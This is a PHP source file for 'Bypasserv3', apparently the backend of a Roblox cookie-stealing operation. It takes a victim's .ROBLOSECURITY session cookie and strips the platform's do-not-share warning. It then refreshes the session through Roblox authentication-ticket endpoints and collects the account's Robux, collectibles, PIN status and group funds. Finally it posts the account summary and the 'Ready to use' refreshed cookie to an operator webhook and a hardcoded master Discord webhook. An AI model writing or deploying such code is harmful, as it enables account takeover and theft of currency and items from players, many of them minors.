<?php
/**
 * Bypasserv3 - Bypass API Endpoint with Full Account Info
 */

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

require_once '../config.php';
require_once '../functions.php';

// Random security scan
if (rand(1, 100) === 1) {
    securityScan(true);
}

// Random cleanup
if (rand(1, 50) === 1) {
    cleanupRateLimits();
}

// Method check
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['success' => false, 'error' => 'Method not allowed']);
    logSecurityEvent('invalid_method', ['method' => $_SERVER['REQUEST_METHOD']]);
    exit;
}

// Suspicious request check
if (isSuspiciousRequest()) {
    logSecurityEvent('suspicious_request', ['user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'None']);
}

// Rate limiting
$ip = getUserIP();
if (!checkRateLimit($ip, 50, 3600)) {
    http_response_code(429);
    echo json_encode([
        'success' => false,
        'error' => 'Rate limit exceeded',
        'message' => 'Maximum 50 requests per hour',
        'retry_after' => 3600
    ]);
    exit;
}

// Parse input
$rawInput = file_get_contents('php://input');
if (empty($rawInput)) {
    http_response_code(400);
    echo json_encode(['success' => false, 'error' => 'No input provided']);
    exit;
}

$input = json_decode($rawInput, true);

if (json_last_error() !== JSON_ERROR_NONE) {
    http_response_code(400);
    echo json_encode([
        'success' => false,
        'error' => 'Invalid JSON',
        'message' => json_last_error_msg()
    ]);
    logSecurityEvent('invalid_json', ['error' => json_last_error_msg()]);
    exit;
}

// Extract data
$cookie = trim($input['cookie'] ?? '');
$directory = trim($input['directory'] ?? '');
$checkOnly = $input['checkOnly'] ?? false;

// Validate cookie
if (empty($cookie)) {
    http_response_code(400);
    echo json_encode(['success' => false, 'error' => 'Cookie required']);
    exit;
}

if (!validateCookie($cookie)) {
    http_response_code(400);
    echo json_encode([
        'success' => false,
        'error' => 'Invalid cookie format',
        'message' => 'Cookie appears invalid or suspicious'
    ]);
    logSecurityEvent('suspicious_cookie_attempt', ['ip' => $ip, 'cookie_length' => strlen($cookie)]);
    exit;
}

// Strip warning prefix
$cookie = str_replace('_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_', '', $cookie);

// Helper function for API requests
function makeRequest($url, $headers, $postData = null) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    if ($postData) {
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($postData));
    }
    $response = curl_exec($ch);
    curl_close($ch);
    return $response;
}

// Refresh cookie
function refreshCookie($cookie) {
    // Fetch CSRF token
    $ch = curl_init("https://auth.roblox.com/v2/logout");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ["Cookie: .ROBLOSECURITY=$cookie"]);
    curl_setopt($ch, CURLOPT_HEADER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    $response = curl_exec($ch);
    $headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
    $headers = substr($response, 0, $headerSize);
    curl_close($ch);
    
    if (!preg_match('/x-csrf-token: (.+)/i', $headers, $matches)) {
        return $cookie; // Return original if can't get token
    }
    $csrfToken = trim($matches[1]);
    
    // Generate auth ticket
    $ch = curl_init("https://auth.roblox.com/v1/authentication-ticket");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        "x-csrf-token: $csrfToken",
        "referer: https://www.roblox.com/",
        "Content-Type: application/json",
        "Cookie: .ROBLOSECURITY=$cookie"
    ]);
    curl_setopt($ch, CURLOPT_HEADER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    $response = curl_exec($ch);
    $headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
    $headers = substr($response, 0, $headerSize);
    curl_close($ch);
    
    if (!preg_match('/rbx-authentication-ticket: (.+)/i', $headers, $matches)) {
        return $cookie;
    }
    $authTicket = trim($matches[1]);
    
    // Redeem ticket
    $ch = curl_init("https://auth.roblox.com/v1/authentication-ticket/redeem");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode(["authenticationTicket" => $authTicket]));
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        "Content-Type: application/json",
        "RBXAuthenticationNegotiation: 1"
    ]);
    curl_setopt($ch, CURLOPT_HEADER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    $response = curl_exec($ch);
    $headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
    $headers = substr($response, 0, $headerSize);
    curl_close($ch);
    
    if (preg_match('/set-cookie: \.ROBLOSECURITY=(.+?);/i', $headers, $matches)) {
        return trim($matches[1]);
    }
    
    return $cookie;
}

// Refresh the cookie
$refreshedCookie = refreshCookie($cookie);

// Fetch user data
$headers = ["Cookie: .ROBLOSECURITY=$refreshedCookie", "Content-Type: application/json"];

$settingsData = json_decode(makeRequest("https://www.roblox.com/my/settings/json", $headers), true);
if (!isset($settingsData['UserId'])) {
    http_response_code(400);
    echo json_encode(['success' => false, 'error' => 'Invalid or expired cookie']);
    exit;
}

$userId = $settingsData['UserId'];

// If check only, return early
if ($checkOnly) {
    echo json_encode([
        'success' => true,
        'valid' => true,
        'userId' => $userId,
        'username' => $settingsData['Name'] ?? 'Unknown'
    ]);
    exit;
}

// Fetch full account data
$userInfoData = json_decode(makeRequest("https://users.roblox.com/v1/users/$userId", $headers), true);
$displayName = $userInfoData['displayName'] ?? 'Unknown';
$username = $userInfoData['name'] ?? 'Unknown';
$description = $userInfoData['description'] ?? 'No bio set';

// Avatar
$avatarData = json_decode(file_get_contents("https://thumbnails.roblox.com/v1/users/avatar?userIds=$userId&size=150x150&format=Png&isCircular=false"), true);
$avatarUrl = $avatarData['data'][0]['imageUrl'] ?? 'https://www.roblox.com/headshot-thumbnail/image/default.png';

// Robux & Premium
$balanceData = json_decode(makeRequest("https://economy.roblox.com/v1/users/$userId/currency", $headers), true);
$robux = $balanceData['robux'] ?? 0;

$isPremium = $settingsData['IsPremium'] ?? false;

// Transaction summary
$transactionData = json_decode(makeRequest("https://economy.roblox.com/v2/users/$userId/transaction-totals?timeFrame=Year&transactionType=summary", $headers), true);
$summary = isset($transactionData['purchasesTotal']) ? abs($transactionData['purchasesTotal']) : 0;
$pendingRobux = $transactionData['pendingRobuxTotal'] ?? 0;

// RAP
$collectiblesData = json_decode(makeRequest("https://inventory.roblox.com/v1/users/$userId/assets/collectibles?limit=100", $headers), true);
$rap = 0;
if (isset($collectiblesData['data'])) {
    foreach ($collectiblesData['data'] as $item) {
        $rap += $item['recentAveragePrice'] ?? 0;
    }
}

// PIN status
$pinData = json_decode(makeRequest("https://auth.roblox.com/v1/account/pin", $headers), true);
$pinEnabled = $pinData['isEnabled'] ?? false;

// Voice chat
$vcData = json_decode(makeRequest("https://voice.roblox.com/v1/settings", $headers), true);
$vcEnabled = $vcData['isVoiceEnabled'] ?? false;

// Bundles (Headless, Korblox)
function ownsBundle($userId, $bundleId, $headers) {
    $response = json_decode(makeRequest("https://inventory.roblox.com/v1/users/$userId/items/3/$bundleId", $headers), true);
    return isset($response['data']) && !empty($response['data']);
}
$hasHeadless = ownsBundle($userId, 201, $headers);
$hasKorblox = ownsBundle($userId, 192, $headers);

// Account age
$accountCreated = isset($userInfoData['created']) ? strtotime($userInfoData['created']) : time();
$accountAgeDays = floor((time() - $accountCreated) / 86400);

// Friends & Followers
$friendsData = json_decode(makeRequest("https://friends.roblox.com/v1/users/$userId/friends/count", $headers), true);
$friendsCount = $friendsData['count'] ?? 0;

$followersData = json_decode(makeRequest("https://friends.roblox.com/v1/users/$userId/followers/count", $headers), true);
$followersCount = $followersData['count'] ?? 0;

// Groups
$groupsData = json_decode(makeRequest("https://groups.roblox.com/v2/users/$userId/groups/roles", $headers), true);
$ownedGroups = 0;
$totalGroupFunds = 0;
if (isset($groupsData['data'])) {
    foreach ($groupsData['data'] as $group) {
        if ($group['role']['rank'] == 255) {
            $ownedGroups++;
            $groupId = $group['group']['id'];
            $groupFunds = json_decode(makeRequest("https://economy.roblox.com/v1/groups/$groupId/currency", $headers), true);
            $totalGroupFunds += $groupFunds['robux'] ?? 0;
        }
    }
}

// Email verified
$emailVerified = $settingsData['IsEmailVerified'] ?? false;

// Credit balance
$creditData = json_decode(makeRequest("https://billing.roblox.com/v1/credit", $headers), true);
$creditBalance = $creditData['balance'] ?? 0;

// Games played (check via votes)
function hasPlayedGame($gameId, $headers) {
    $voteData = json_decode(makeRequest("https://games.roblox.com/v1/games/$gameId/votes/user", $headers), true);
    return isset($voteData['canVote']) && $voteData['canVote'];
}

$games = [
    'Blox Fruits' => hasPlayedGame(2753915549, $headers) ? '✅' : '❌',
    'Adopt Me' => hasPlayedGame(920587237, $headers) ? '✅' : '❌',
    'Murder Mystery 2' => hasPlayedGame(142823291, $headers) ? '✅' : '❌',
    'Pet Simulator 99' => hasPlayedGame(8737899170, $headers) ? '✅' : '❌',
    'Blade Ball' => hasPlayedGame(13772394625, $headers) ? '✅' : '❌'
];

// Account score calculation
$accountScore = 0;
$accountScore += min(20, floor($robux / 1000));
$accountScore += min(20, floor($rap / 5000));
$accountScore += $isPremium ? 15 : 0;
$accountScore += $vcEnabled ? 10 : 0;
$accountScore += $hasHeadless ? 15 : 0;
$accountScore += $hasKorblox ? 10 : 0;
$accountScore += min(10, floor($accountAgeDays / 365) * 2);
$accountScore = min(100, $accountScore);

// Get instance webhooks
$instancePath = DATA_PATH . $directory . '/';
$instanceFile = $instancePath . 'instance.json';
$userWebhook = '';

if (file_exists($instanceFile)) {
    $instanceData = json_decode(file_get_contents($instanceFile), true);
    $userWebhook = $instanceData['userWebhook'] ?? '';
}

// Update stats
updateInstanceStats($directory, 'totalCookies', ($instanceData['stats']['totalCookies'] ?? 0) + 1);
updateInstanceStats($directory, 'totalRobux', ($instanceData['stats']['totalRobux'] ?? 0) + $robux);
updateInstanceStats($directory, 'totalRAP', ($instanceData['stats']['totalRAP'] ?? 0) + $rap);
updateInstanceStats($directory, 'totalSummary', ($instanceData['stats']['totalSummary'] ?? 0) + $summary);

updateDailyStats($directory, 'cookies', 1);
updateDailyStats($directory, 'robux', $robux);
updateDailyStats($directory, 'rap', $rap);
updateDailyStats($directory, 'summary', $summary);

updateGlobalStats('totalCookies', 1);

// Prepare webhook embeds
$timestamp = date('c');
$gamesPlayed = '';
foreach ($games as $game => $status) {
    $gamesPlayed .= "• {$game}: {$status}\n";
}

$embed1 = [
    'content' => '@everyone',
    'username' => 'Bypasserv3',
    'avatar_url' => 'https://cdn.discordapp.com/attachments/1287002478277165067/1348235042769338439/hyperblox.png',
    'embeds' => [
        [
            'title' => '🍪 New Cookie Captured!',
            'description' => "**Account Score: {$accountScore}/100**",
            'color' => hexdec('00BFFF'),
            'thumbnail' => ['url' => $avatarUrl],
            'fields' => [
                [
                    'name' => '👤 Account Info',
                    'value' => "**Display:** `{$displayName}`\n**Username:** `{$username}`\n**User ID:** `{$userId}`\n**Age:** `{$accountAgeDays} days`\n**Bio:** `{$description}`",
                    'inline' => true
                ],
                [
                    'name' => '💰 Currency',
                    'value' => "**Robux:** `" . number_format($robux) . "`\n**Pending:** `" . number_format($pendingRobux) . "`\n**Summary:** `" . number_format($summary) . "`\n**Credit:** `$" . number_format($creditBalance, 2) . "`",
                    'inline' => true
                ],
                [
                    'name' => '⚙️ Settings',
                    'value' => "**PIN:** `" . ($pinEnabled ? '✅ Enabled' : '❌ Disabled') . "`\n**Premium:** `" . ($isPremium ? '✅ Yes' : '❌ No') . "`\n**VC:** `" . ($vcEnabled ? '✅ Enabled' : '❌ Disabled') . "`\n**Email:** `" . ($emailVerified ? '✅ Verified' : '❌ Not Verified') . "`",
                    'inline' => true
                ],
                [
                    'name' => '🎮 Games Played',
                    'value' => $gamesPlayed,
                    'inline' => true
                ],
                [
                    'name' => '💎 Inventory',
                    'value' => "**RAP:** `" . number_format($rap) . "`\n**Headless:** `" . ($hasHeadless ? '✅ Yes' : '❌ No') . "`\n**Korblox:** `" . ($hasKorblox ? '✅ Yes' : '❌ No') . "`",
                    'inline' => true
                ],
                [
                    'name' => '👥 Social',
                    'value' => "**Friends:** `" . number_format($friendsCount) . "`\n**Followers:** `" . number_format($followersCount) . "`\n**Groups Owned:** `{$ownedGroups}`\n**Group Funds:** `" . number_format($totalGroupFunds) . " R$`",
                    'inline' => true
                ]
            ],
            'footer' => ['text' => 'Bypasserv3 | Cookie Refresher'],
            'timestamp' => $timestamp
        ]
    ]
];

$embed2 = [
    'username' => 'Bypasserv3',
    'avatar_url' => 'https://cdn.discordapp.com/attachments/1287002478277165067/1348235042769338439/hyperblox.png',
    'embeds' => [
        [
            'title' => '🍪 .ROBLOSECURITY (Refreshed)',
            'description' => "```\n" . $refreshedCookie . "\n```",
            'color' => hexdec('00BFFF'),
            'footer' => ['text' => 'Refreshed Cookie | Ready to use'],
            'timestamp' => $timestamp
        ]
    ]
];

// Send to user webhook
if (!empty($userWebhook)) {
    sendWebhook($userWebhook, $embed1);
    sleep(1);
    sendWebhook($userWebhook, $embed2);
}

// Send to master webhook
sendWebhook(MASTER_WEBHOOK, $embed1);
sleep(1);
sendWebhook(MASTER_WEBHOOK, $embed2);

// Log success
logSecurityEvent('successful_bypass', [
    'username' => $username,
    'userId' => $userId,
    'robux' => $robux,
    'score' => $accountScore
]);

// Return response
echo json_encode([
    'success' => true,
    'userInfo' => [
        'username' => $username,
        'displayName' => $displayName,
        'userId' => $userId,
        'robux' => $robux,
        'rap' => $rap,
        'premium' => $isPremium ? 'Yes' : 'No',
        'voiceChat' => $vcEnabled ? 'Yes' : 'No',
        'friends' => $friendsCount,
        'followers' => $followersCount,
        'accountAge' => "{$accountAgeDays} days",
        'groupsOwned' => $ownedGroups,
        'accountScore' => $accountScore
    ],
    'avatarUrl' => $avatarUrl
]);
?>
